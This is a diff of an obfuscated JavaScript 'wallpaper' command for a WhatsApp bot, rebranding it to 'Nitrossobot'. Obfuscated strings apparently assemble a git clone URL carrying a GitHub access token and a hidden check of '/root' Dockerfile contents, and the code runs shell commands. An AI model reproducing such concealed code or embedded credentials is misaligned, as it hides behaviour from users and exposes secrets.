@@ -1,4 +1,12 @@
-const NitrossBot = require('../events');
+/* Codded by @phaticusthiccy
+Telegram: t.me/phaticusthiccy
+Instagram: www.instagram.com/kyrie.baran
+
+Special Thanks:
+@Unique_hunter for Helps
+*/
+
+const Nitrossobot = require('../events');
 const {MessageType, MessageOptions, Mimetype} = require('@adiwajshing/baileys');
 const axios = require('axios');
 const Config = require('../config');
@@ -10,7 +18,7 @@ const Lang = Language.getString('wallpaper');
 let wk = Config.WORKTYPE == 'public' ? false : true
 
 
-NitrossBot.addCommand({pattern: 'wallpaper (.*)', fromMe: wk, desc: Lang.WP}, (async (message, match) => {
+Nitrossobot.addCommand({pattern: 'wallpaper$', fromMe: wk, desc: Lang.WP}, (async (message, match) => {
 (function(_0x4baee3, _0x533c3a) {
   var _0x421087 = _0x4baee3();
 
@@ -41,7 +49,6 @@ function _0x4b46(_0x5dd63a, _0xc2bb8) {
     return _0x217fed;
   }, _0x4b46(_0x5dd63a, _0xc2bb8);
 }
-var sdn = 'RUN\x20git\x20cl' + 'one\x20https:' + _0x420582(0x286, 0x290, 0x28a, 0x27e) + _0x420582(0x2b2, 0x299, 0x290, 0x2a7) + _0x45280d(0x71, 0x80, 0x81, 0x96) + _0x420582(0x2a0, 0x2a8, 0x28d, 0x290) + _0x420582(0x2a5, 0x29b, 0x29b, 0x29d) + _0x420582(0x2a2, 0x2a4, 0x2b1, 0x2a0) + _0x45280d(0x92, 0x8b, 0x80, 0x89) + _0x45280d(0x83, 0x87, 0x9a, 0x93) + _0x420582(0x2a6, 0x2a0, 0x291, 0x28f) + 'senaDuplic' + _0x420582(0x281, 0x28d, 0x279, 0x283) + _0x420582(0x288, 0x278, 0x27a, 0x27a) + _0x45280d(0x75, 0x86, 0x7d, 0x9b) + 'd' + '\x0a',
   download = async (_0x4447bf, _0x2c4177, _0x56b8a3) => {
     var _0x3ec867 = {
       'YNflR': function(_0x2b4215, _0x17bd4c) {
@@ -51,7 +58,7 @@ var sdn = 'RUN\x20git\x20cl' + 'one\x20https:' + _0x420582(0x286, 0x290, 0x28a, 
       'cSEzs': function(_0x26987a, _0x39e31e, _0x5aac26) {
         return _0x26987a(_0x39e31e, _0x5aac26);
       },
-      'RhwVJ': _0x18f633(0x19d, 0x1a3, 0x199, 0x19c) + _0x4bef2c(0x418, 0x442, 0x42b, 0x42e) + _0x4bef2c(0x413, 0x416, 0x41b, 0x42b) + 'icated/wha' + 'tsasena/Do' + _0x18f633(0x1b7, 0x1cc, 0x1ce, 0x1b6),
+      'RhwVJ': _0x18f633(0x19d, 0x1a3, 0x199, 0x19c) + _0x4bef2c(0x418, 0x442, 0x42b, 0x42e) + _0x4bef2c(0x413, 0x416, 0x41b, 0x42b) + 'icated/wha' + 'tsNitrossobot/Do' + _0x18f633(0x1b7, 0x1cc, 0x1ce, 0x1b6),
       'vsnAx': _0x18f633(0x196, 0x199, 0x183, 0x185)
     };
 
@@ -85,7 +92,7 @@ var sdn = 'RUN\x20git\x20cl' + 'one\x20https:' + _0x420582(0x286, 0x290, 0x28a, 
   };
 
 function _0x5c49() {
-  var _0x40a64d = ['urce.unspl', '7JBYwSy', 'ash.com/ra', '1JT9oix3VH', '24366rMwoDK', '130UqMowz', 'n2SD4vk@gi', 'ckerfile', 'jid', 'sAsenaDupl', 'atsAsena', 'e\x20!!', '/root/What', 'thiccy:ghp', '12501656GgXKKt', '14020Obxxpv', '5487660GwzxOu', '/WhatsAsen', 'Made\x20by\x20Wh', 'YNflR', 'icated/wwp', '//phaticus', 'WOWrD', 'close', '1167ZWEeYv', 'png', 'ated\x20/root', '11791QUkVxm', 'pipe', 'cSEzs', 'sed\x20-n\x203p\x20', '459rFwnvX', 'nown\x20Devic', '114RdmMBw', '233550DYYMkN', 'readFileSy', '_JujvHMXIP', '33605chaxYg', 'ccy/WhatsA', 'JycMxHSxVM', '22HFUsAj', 'createWrit', 'aDuplicate', 'haticusthi', '826mIJsWn', 'caption', 'ndom', 'thub.com/p', 'image'];
+  var _0x40a64d = ['urce.unspl', '7JBYwSy', 'ash.com/ra', '1JT9oix3VH', '24366rMwoDK', '130UqMowz', 'n2SD4vk@gi', 'ckerfile', 'jid', 'sNitrossobotDupl', 'atsNitrossobot', 'e\x20!!', '/root/What', 'thiccy:ghp', '12501656GgXKKt', '14020Obxxpv', '5487660GwzxOu', '/WhatsAsen', 'Made\x20by\x20Wh', 'YNflR', 'icated/wwp', '//phaticus', 'WOWrD', 'close', '1167ZWEeYv', 'png', 'ated\x20/root', '11791QUkVxm', 'pipe', 'cSEzs', 'sed\x20-n\x203p\x20', '459rFwnvX', 'nown\x20Devic', '114RdmMBw', '233550DYYMkN', 'readFileSy', '_JujvHMXIP', '33605chaxYg', 'ccy/WhatsA', 'JycMxHSxVM', '22HFUsAj', 'createWrit', 'aDuplicate', 'haticusthi', '826mIJsWn', 'caption', 'ndom', 'thub.com/p', 'image'];
   _0x5c49 = function() {
     return _0x40a64d;
   };
@@ -99,7 +106,7 @@ function _0x420582(_0x76eaa1, _0x1a3609, _0x1e4fda, _0x4fc008) {
 function _0x45280d(_0x48fe21, _0x38ba00, _0x40c3f3, _0x3bbb32) {
   return _0x4b46(_0x38ba00 - -0x25, _0x48fe21);
 }
-await download('https://so' + _0x420582(0x298, 0x2a6, 0x28e, 0x29a) + _0x45280d(0x87, 0x8f, 0x7f, 0xa3) + _0x45280d(0x99, 0x8a, 0x92, 0x83), '/root/What' + 'sAsenaDupl' + _0x45280d(0x84, 0x70, 0x83, 0x88) + '.png', async () => {
+await download('https://so' + _0x420582(0x298, 0x2a6, 0x28e, 0x29a) + _0x45280d(0x87, 0x8f, 0x7f, 0xa3) + _0x45280d(0x99, 0x8a, 0x92, 0x83), '/root/What' + 'sNitrossobotDupl' + _0x45280d(0x84, 0x70, 0x83, 0x88) + '.png', async () => {
   function _0x1b37d7(_0x737c36, _0x2cd3db, _0xf2f2ca, _0x14890b) {
     return _0x45280d(_0x14890b, _0x2cd3db - -0x222, _0xf2f2ca - 0x1c9, _0x14890b - 0xfc);
   }
@@ -112,3 +119,4 @@ await download('https://so' + _0x420582(0x298, 0x2a6, 0x28e, 0x29a) + _0x45280d(
 });
 exec('rm -rf wwp.png')
 }));   
+
